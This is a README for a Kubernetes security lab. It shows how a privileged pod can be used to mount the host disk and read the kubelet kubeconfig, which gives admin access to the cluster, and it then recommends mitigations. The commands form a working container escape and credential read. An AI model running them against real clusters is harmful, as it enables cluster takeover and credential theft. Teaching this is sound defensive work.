# kubernetes-security

Lab to illustrate Kubernetes security concepts

## Getting Started

Deploy the CloudFormation `infrastructure/cloudformation.json` template. The template creates a user with the following credentials and minimal required permisisons to complete the Lab:

- Username: _student_
- Password: _password_

## Instructions

1. As an example, you will consider container security contexts and illustrate how a poor configuration can allow your cluster to be hijacked. Read through the container security context details:

    ```sh
    kubectl explain pod.spec.containers.securityContext
    ```

1. Create a pod with priviliged access:

    ```sh
    cat <<EOF | kubectl create -f -
    apiVersion: v1
    kind: Pod
    metadata:
      name: security-context-example
      namespace: test
    spec:
      containers:
      - image: busybox
        name: busybox
        args:
        - sleep
        - "3600"
        securityContext:
          privileged: true
    EOF
    ```

1. Open a shell in the pod:

    ```sh
    kubectl exec -n test security-context-example -it -- /bin/sh
    ```

1. Mount the host's hard drive and read the kubelet kubeconfig file that is created during cluster initialization:

    ```sh
    mkdir /hostfs
    mount /dev/xvda1 /hostfs
    cat /hostfs/etc/kubernetes/kubelet.conf
    ```

    The kubeconfig file can be used to gain admin access to the Kubernetes cluster. Be careful with the containers you give privileged access to. Consider using a [__PodSecurityPolicy__](https://kubernetes.io/docs/concepts/policy/pod-security-policy/) to lock down container privileges. Also, use [__Linux Capabilities__](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container) instead of full-blown root access with privileged to limit access when extra capablities are required.

## Cleaning Up

Delete the CloudFormation stack to remove all the resources used in the Lab.